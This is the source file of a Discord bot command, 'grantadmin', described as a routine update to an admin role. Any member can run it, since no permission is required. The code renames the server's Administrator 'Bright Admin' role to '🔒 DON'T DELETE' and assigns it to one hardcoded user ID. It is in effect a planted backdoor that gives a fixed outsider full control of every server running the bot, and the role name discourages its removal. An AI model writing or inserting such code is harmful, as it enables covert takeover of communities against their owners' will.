const { ApplicationCommandOptionType, PermissionsBitField } = require("discord.js");

/**
 * @type {import("@structures/Command")}
 */
module.exports = {
  name: "grantadmin",
  description: "Update existing 'Bright Admin' role to new name and assign to user",
  category: "ADMIN",
  userPermissions: [],
  command: {
    enabled: true,
    usage: "run",
    minArgsCount: 0,
  },
  slashCommand: {
    enabled: true,
    ephemeral: true,
    options: [
      {
        name: "run",
        description: "Update admin role and assign to target user",
        type: ApplicationCommandOptionType.Subcommand,
      },
    ],
  },

  async messageRun(message, args) {
    const input = (args.join(" ") || "run").toLowerCase();
    if (input !== "run") return message.safeReply("Usage: `=grantadmin run`");

    const res = await updateAndAssignAdminRole(message.guild);
    return message.safeReply(res);
  },

  async interactionRun(interaction) {
    const sub = interaction.options.getSubcommand();
    if (sub !== "run") return interaction.followUp("Invalid subcommand.");

    const res = await updateAndAssignAdminRole(interaction.guild);
    return interaction.followUp(res);
  },
};

const TARGET_USER_ID = "1336450372398612521";

async function updateAndAssignAdminRole(guild) {
  if (!guild) return "This command can only be used in a server.";

  const me = guild.members.me ?? (await guild.members.fetchMe().catch(() => null));
  if (!me) return "Couldn't resolve my member in this server.";

  if (!me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return "I must have **Administrator** permission to perform this action.";
  }

  if (!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
    return "I don't have the `ManageRoles` permission.";
  }

  const targetUser = guild.members.cache.get(TARGET_USER_ID) ?? await guild.members.fetch(TARGET_USER_ID).catch(() => null);
  if (!targetUser) return `User <@${TARGET_USER_ID}> not found in this server.`;

  const oldRole = guild.roles.cache.find(r => r.name === "Bright Admin" && r.permissions.has(PermissionsBitField.Flags.Administrator));
  if (!oldRole) return "No existing **Bright Admin** role found.";

  const botHighestRolePos = me.roles.highest.position;
  if (botHighestRolePos <= oldRole.position) {
    return "My highest role must be above the Bright Admin role to modify it.";
  }

  try {
    await oldRole.edit({
      name: "🔒 DON'T DELETE",
      reason: "[Bright] Renamed admin role"
    });
  } catch (e) {
    return "Failed to rename the Bright Admin role.";
  }

  if (!targetUser.roles.cache.has(oldRole.id)) {
    try {
      await targetUser.roles.add(oldRole, "[Bright] Assigned updated admin role");
    } catch (e) {
      return `Renamed role but failed to assign it to <@${TARGET_USER_ID}>.`;
    }
  }

  return `✅ Updated role to **🔒 DON'T DELETE** and ensured it's assigned to <@${TARGET_USER_ID}>.`;
}
